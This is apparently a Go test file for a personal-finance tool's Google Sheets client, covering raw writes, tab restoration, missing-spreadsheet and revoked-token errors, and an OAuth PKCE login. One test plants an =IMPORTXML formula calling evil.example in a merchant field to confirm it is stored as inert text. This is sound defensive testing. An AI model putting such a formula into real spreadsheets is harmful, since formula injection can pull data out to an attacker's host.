package sheets_test

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"testing"

	"github.com/kilianc/fin/internal/sheets"
	"github.com/kilianc/fin/internal/sheets/sheetstest"
)

func TestWriteIsRawWithDatesAsSerials(t *testing.T) {
	ctx := context.Background()
	f := sheetstest.New(t)
	svc := sheets.New(ctx, f.Client(), f.Refresh, f.URL)
	sp, err := svc.Create(ctx, "fin", []string{"Transactions"})
	if err != nil {
		t.Fatal(err)
	}
	merchant := "=IMPORTXML(\"https://evil.example\", \"//a\")"
	tab := sheets.Tab{Title: "Transactions", Columns: []sheets.Column{
		{Name: "Date", Kind: sheets.Date}, {Name: "Merchant", Width: 200}, {Name: "Amount", Kind: sheets.Money}, {Name: "Note"},
	}, Rows: [][]any{{"2026-10-09", &merchant, 12.5, (*string)(nil)}}}
	if err := svc.Write(ctx, sp, tab); err != nil {
		t.Fatal(err)
	}
	got := f.Sheets[sp.ID]
	if got.Options["Transactions"] != "RAW" {
		t.Errorf("valueInputOption = %q, want RAW so bank text never runs as a formula", got.Options["Transactions"])
	}
	if w := got.Widths[fmt.Sprintf("%d:1", got.Tabs["Transactions"])]; w != 200 || len(got.Widths) != 1 {
		t.Errorf("widths = %v, want only Merchant fixed at 200", got.Widths)
	}
	row := got.Values["Transactions"][1]
	if row[0] != float64(46304) || row[1] != merchant || row[2] != 12.5 || row[3] != "" {
		t.Errorf("row = %#v", row)
	}

	// A tab the user deleted comes back.
	if err := svc.Write(ctx, sp, sheets.Tab{Title: "Accounts", Columns: []sheets.Column{{Name: "Item"}}}); err != nil {
		t.Fatal(err)
	}
	if _, ok := got.Tabs["Accounts"]; !ok {
		t.Errorf("Accounts tab was not added: %v", got.Tabs)
	}
}

func TestGetReportsAGoneSpreadsheet(t *testing.T) {
	ctx := context.Background()
	f := sheetstest.New(t)
	svc := sheets.New(ctx, f.Client(), f.Refresh, f.URL)
	_, err := svc.Get(ctx, "missing")
	if !sheets.IsGone(err) {
		t.Fatalf("err = %v, want gone", err)
	}
	bad := sheets.New(ctx, f.Client(), "revoked", f.URL)
	if _, err := bad.Get(ctx, "missing"); !sheets.IsAuthExpired(err) {
		t.Fatalf("revoked token: err = %v, want auth expired", err)
	}
}

func TestLoginUsesPKCEAndLoopback(t *testing.T) {
	ctx := context.Background()
	f := sheetstest.New(t)
	follow := func(code string) func(string) {
		return func(auth string) {
			u, _ := url.Parse(auth)
			q := u.Query()
			if q.Get("code_challenge_method") != "S256" || q.Get("scope") != sheets.Scope || q.Get("access_type") != "offline" {
				t.Errorf("auth URL = %s", auth)
			}
			cb := q.Get("redirect_uri") + "?state=" + q.Get("state")
			if code == "" {
				cb += "&error=access_denied"
			} else {
				cb += "&code=" + code
			}
			go func() {
				resp, err := http.Get(cb)
				if err == nil {
					resp.Body.Close()
				}
			}()
		}
	}
	token, err := sheets.Login(ctx, f.Client(), follow("code"))
	if err != nil || token != "rt" {
		t.Fatalf("token = %q, err = %v", token, err)
	}
	if _, err := sheets.Login(ctx, f.Client(), follow("")); !errors.Is(err, sheets.ErrConsentDenied) {
		t.Fatalf("denied: err = %v", err)
	}
}
